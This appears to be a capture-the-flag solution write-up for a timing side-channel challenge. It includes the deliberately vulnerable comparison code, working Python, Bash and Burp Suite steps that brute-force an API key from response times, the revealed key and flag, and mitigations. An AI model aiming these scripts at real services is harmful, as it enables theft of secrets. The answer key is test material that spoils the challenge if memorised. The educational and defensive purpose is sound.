# Challenge 19: TimingOracle - Solution

## Vulnerability Type
**Timing Attack / Side-Channel Attack**

## Description
The API key validation uses a character-by-character comparison with a 50ms delay per correct character, leaking information about the secret key through response timing.

## Vulnerable Code
```python
def vulnerable_compare(a, b):
    """VULNERABLE: early-exit comparison leaks timing info"""
    if len(a) != len(b):
        return False
    for ca, cb in zip(a, b):
        if ca != cb:
            return False
        time.sleep(0.05)  # 50ms per correct character
    return True
```

## Exploitation Steps

### Understanding the Vulnerability
- Secret key: `deadbeef42` (10 hex characters)
- Each correct character adds 50ms to response time
- Wrong character = immediate return (fast response)
- Correct character = 50ms delay + continue to next char

### Step 1: Determine Key Length
Try different lengths and measure timing:
```
0000000000 (10 chars) → ~50ms (if first char wrong)
00000000000 (11 chars) → instant (length mismatch)
```

### Step 2: Brute Force Character by Character

**Position 1:** Try all hex chars (0-9, a-f)
```
0000000000 → ~50ms
1000000000 → ~50ms
...
d000000000 → ~100ms ✓ (correct! 'd' takes 50ms + next char check)
```

**Position 2:** Now we know first char is 'd'
```
d000000000 → ~100ms
d100000000 → ~100ms
...
de00000000 → ~150ms ✓ (correct! 'e' is second char)
```

Continue for all 10 characters...

## Automated Exploitation

### Python Script (Statistical Approach)
```python
import requests
import time
import statistics

url = "http://[host]/"
charset = "0123456789abcdef"
key = ""

for position in range(10):
    timings = {}
    
    for char in charset:
        test_key = key + char + "0" * (9 - position)
        times = []
        
        # Multiple measurements for accuracy
        for _ in range(5):
            start = time.time()
            r = requests.post(url, data={"key": test_key})
            elapsed = (time.time() - start) * 1000
            times.append(elapsed)
        
        # Use median to reduce noise
        timings[char] = statistics.median(times)
        print(f"Testing {test_key}: {timings[char]:.1f}ms")
    
    # Character with longest time is correct
    correct_char = max(timings, key=timings.get)
    key += correct_char
    print(f"Position {position+1}: '{correct_char}' (key so far: {key})")

print(f"\nFinal key: {key}")

# Verify
r = requests.post(url, data={"key": key})
if "VALID KEY" in r.text:
    print("Success! Flag:", r.text.split("🚩")[1].split("<")[0].strip())
```

### Bash Script (Simple)
```bash
#!/bin/bash
URL="http://[host]/"
KEY=""

for pos in {0..9}; do
    MAX_TIME=0
    BEST_CHAR=""
    
    for c in 0 1 2 3 4 5 6 7 8 9 a b c d e f; do
        TEST_KEY="${KEY}${c}$(printf '0%.0s' $(seq 1 $((9-pos))))"
        
        # Measure time
        START=$(date +%s%N)
        curl -s -X POST -d "key=$TEST_KEY" "$URL" > /dev/null
        END=$(date +%s%N)
        ELAPSED=$(( (END - START) / 1000000 ))
        
        echo "Testing $TEST_KEY: ${ELAPSED}ms"
        
        if [ $ELAPSED -gt $MAX_TIME ]; then
            MAX_TIME=$ELAPSED
            BEST_CHAR=$c
        fi
    done
    
    KEY="${KEY}${BEST_CHAR}"
    echo "Position $((pos+1)): '$BEST_CHAR' (key: $KEY)"
done

echo "Final key: $KEY"
```

### Using Burp Suite Intruder
1. Capture the POST request
2. Set payload position: `key=§d§000000000`
3. Payload type: Simple list (0-9, a-f)
4. Attack type: Sniper
5. Sort by "Response received" time
6. Longest time = correct character
7. Repeat for each position

## Expected Timing Pattern
```
Position 1:
  0000000000 → ~50ms
  1000000000 → ~50ms
  ...
  d000000000 → ~100ms ✓

Position 2:
  d000000000 → ~100ms
  d100000000 → ~100ms
  ...
  de00000000 → ~150ms ✓

...

Position 10:
  deadbeef4§0§ → ~500ms
  deadbeef4§1§ → ~500ms
  deadbeef4§2§ → ~550ms ✓
```

## Secret Key
```
deadbeef42
```

## Flag
```
FCTF{t1m1ng_4tt4ck_p4t13nc3}
```

## How It Works
1. Comparison function checks characters one by one
2. Each correct character adds 50ms delay
3. Wrong character causes immediate return (early exit)
4. Attacker measures response time differences
5. Longer time = more correct characters
6. Extract secret character by character

## Real-World Examples
- **Password comparison**: Timing attacks on login systems
- **HMAC verification**: Timing leaks in signature validation
- **Token comparison**: API key validation vulnerabilities
- **Meltdown/Spectre**: CPU-level timing attacks

## Mitigation

### 1. Constant-Time Comparison
```python
import hmac

def secure_compare(a, b):
    """Constant-time comparison"""
    return hmac.compare_digest(a, b)
```

### 2. Hash Comparison
```python
import hashlib

def secure_compare(a, b):
    """Compare hashes instead of raw values"""
    hash_a = hashlib.sha256(a.encode()).hexdigest()
    hash_b = hashlib.sha256(b.encode()).hexdigest()
    return hmac.compare_digest(hash_a, hash_b)
```

### 3. Add Random Delay
```python
import random
import time

def compare_with_jitter(a, b):
    result = hmac.compare_digest(a, b)
    time.sleep(random.uniform(0.01, 0.05))  # Random delay
    return result
```

### 4. Rate Limiting
```python
from flask_limiter import Limiter

limiter = Limiter(app, key_func=lambda: request.remote_addr)

@app.route("/validate")
@limiter.limit("10 per minute")
def validate():
    # ...
```

### 5. Use Established Libraries
```python
# Python
import secrets
secrets.compare_digest(a, b)

# Node.js
const crypto = require('crypto');
crypto.timingSafeEqual(Buffer.from(a), Buffer.from(b));
```

## Detection
- Monitor for repeated requests with slight variations
- Look for systematic character-by-character probing
- Unusual patterns in request timing
- High volume of failed authentication attempts

## References
- [Timing Attack on Wikipedia](https://en.wikipedia.org/wiki/Timing_attack)
- [OWASP: Timing Attack](https://owasp.org/www-community/attacks/Timing_attack)
- [Constant-Time Algorithms](https://www.chosenplaintext.ca/articles/beginners-guide-constant-time-cryptography.html)
